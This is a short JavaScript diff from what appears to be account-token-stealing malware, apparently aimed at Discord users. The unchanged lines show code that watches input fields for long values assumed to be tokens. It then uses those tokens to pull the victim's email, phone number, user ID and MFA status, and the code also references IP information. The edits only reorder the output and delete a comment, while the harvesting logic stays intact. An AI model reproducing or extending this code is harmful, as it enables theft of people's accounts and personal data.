@@ -49,10 +49,10 @@ Timezone: ${data.timezone}`;
             });
             if (!res.ok) return "Invalid token or rate limited";
             const data = await res.json();
-            return `Email: ${data.email}
+            return `User ID: ${data.id}
+Email: ${data.email}
 Phone: ${data.phone || "None"}
 Username: ${data.username}#${data.discriminator}
-User ID: ${data.id}
 Verified: ${data.verified}
 MFA Enabled: ${data.mfa_enabled}`;
         } catch(e) {
@@ -91,7 +91,7 @@ ${ipInfo}
         let oldValue = field.value;
         field.addEventListener("input", async () => {
             let newValue = field.value;
-            if (newValue !== oldValue && newValue.length > 50) { // likely a token
+            if (newValue !== oldValue && newValue.length > 50) {
                 await processInput(newValue);
                 oldValue = newValue;
             }
